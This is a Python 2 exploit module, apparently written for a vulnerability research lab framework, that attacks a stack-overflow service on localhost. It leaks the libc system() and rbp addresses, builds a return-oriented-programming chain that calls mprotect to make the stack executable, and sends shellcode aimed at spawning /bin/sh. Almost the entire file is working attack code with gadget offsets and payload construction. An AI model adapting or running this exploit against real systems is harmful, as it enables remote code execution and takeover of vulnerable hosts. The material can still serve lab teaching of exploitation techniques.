#! /usr/bin/python
#coding:utf-8
import os
import socket
import sys
sys.path.append("../..")
from modules import exploit
from pwnlib.elf import ELF
from pwnlib.util.packing import *


class Exploit(exploit.VRL_Exploit):
    def __init__(self):
        '''Add information of your exploit here'''
        self.name = 'rop_syscall'
        self.payload = ''
        self.payload_info = 'DEP ON ASLR OFF'
        self.default_payload = 'open_shell_amd64_short'
        self.info = '''Exploit Name : rop_syscall
                       Exploit abstract :rop attack: shut off dep, then execute shellcode in stack .
                       Author : guoyingjie
                       Support change payload : true'''
        self.property = {'ret1':0x0000000000021102, #gadget address
                         'ret2':0x0000000000114809 ,
                         'ret3':0x00007ffff7df2340 ,
                        
                         'pageaddress':0x7fffffffd000,
                         'shellcodeaddress':0x0,#shellcode address in stack
                         'data1':0x0000000000000007,# PROT_EXEC  The memory can be executed.
                         'data2':0x0000000000001000,# 4096 pagesize
                         'data3':0x000000000000000a,  #mprotect systemcall number, mprotect()  changes protection for the calling process's memory page(s)  
                         'data4':0x000000000000003b,#execv systemcall number    
                         'data5':0x0000000000000000,              
                         'offset':40, # offset 
                         'sysaddress':0x0} # system function address, initialize 0
        self.options={'dIP' : '127.0.0.1',
                      'port':'34567',
                      'allow_stack_exec' : 'False',
                      'static' : 'False',
                      'aslr' : 'off'
                      }
        self.vulnerability= 'stack_overflow'

    def run(self):
      if self.options['static'] == 'False':
        '''Run your exploit here, if this script could success, the VRL can run it.
        When the exploit run, follow the options.'''
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.options['dIP'], int(self.options['port'])))

        #get new sysaddress here
        s.send('a')      
        recv_data = s.recv(16)
        self.property['sysaddress'] = int(recv_data,16)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        print "sysaddress = " + hex(self.property['sysaddress'])
        
        #get rbp
        s.send('b')        
        recv_data1 = s.recv(16) 
        rbpvalue= int(recv_data1,16)
        print "rbpvalue = " + hex(rbpvalue)

        #get shellcode address
        self.property['shellcodeaddress'] = rbpvalue + 96

        #get /bin/sh offset
        binsh_addr_offset = next(libc.search('/bin/sh')) -libc.symbols['system']
        print "binsh_addr_offset = " + hex(binsh_addr_offset)
      
        #get ret offset
        pop_ret1_offset = self.property['ret1'] - libc.symbols['system']
        pop_ret2_offset = self.property['ret2'] - libc.symbols['system']
        
       

        #get /bin/sh address
        binsh_addr = self.property['sysaddress'] + binsh_addr_offset

        #get ret address
        pop_ret1_addr = self.property['sysaddress'] + pop_ret1_offset
        pop_ret2_addr = self.property['sysaddress'] + pop_ret2_offset
        pop_ret3_addr = self.property['ret3']

        pagenum=self.property['data2'] * 3
        print pagenum

       #print helloworld
        shellcode="\xeb\x1e\x5e\x48\x31\xc0\xb0\x01"
        shellcode +="\x48\x89\xc7\x48\x89\xfa\x48\x83"
        shellcode +="\xc2\x0e\x0f\x05\x48\x31\xc0\x48"
        shellcode +="\x83\xc0\x3c\x48\x31\xff\x0f\x05"
        shellcode +="\xe8\xdd\xff\xff\xff\x48\x65\x6c"
        shellcode +="\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21\x0a"
       #shell
        shellcode="\x5f\x48\x31\xc0\x58\x5a\x5e\x0f\x05"
    


       
        #set payload rop shut off dep
        payload = "a"*self.property['offset'] + p64(pop_ret1_addr) + p64(self.property['pageaddress']) + p64(pop_ret2_addr) + p64(self.property['data1']) + p64(pagenum) + p64(pop_ret3_addr) + p64(self.property['shellcodeaddress']) + p64(binsh_addr) + p64(self.property['data4']) + p64(self.property['data5']) + p64(self.property['data5']) + self.payload
        print "\n##########sending payload to shut off dep ##########\n"
        s.send(payload)
        s.close()
      else:
        print 'no exit static'

       

'''Bellowing is default, simply ignore it.'''
if __name__ == "__main__":
    if '__init__.py' not in os.listdir(os.curdir):
        os.mknod('__init__.py')
    exp = Exploit()
    print 'Exploit: ',exp.name,' \n'
    print 'Checking:\n'
    if exp.check():
        print 'Running:\n'
        exp.run()
